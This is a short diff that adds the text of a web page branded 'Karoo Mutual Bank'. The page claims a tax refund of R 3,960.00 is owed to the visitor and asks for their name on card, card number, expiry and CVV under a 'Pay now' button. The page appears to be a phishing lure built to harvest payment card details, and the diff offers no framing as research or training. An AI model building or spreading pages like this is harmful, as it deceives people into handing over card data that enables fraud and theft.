@@ -1,0 +1,11 @@
+Karoo Mutual Bank
+Tax refund
+
+You are owed a refund of R 3,960.00. Enter your card to receive it within 2 hours.
+
+Name on card
+Card number
+Expiry (MM/YY)
+CVV
+Pay now
+© 2026
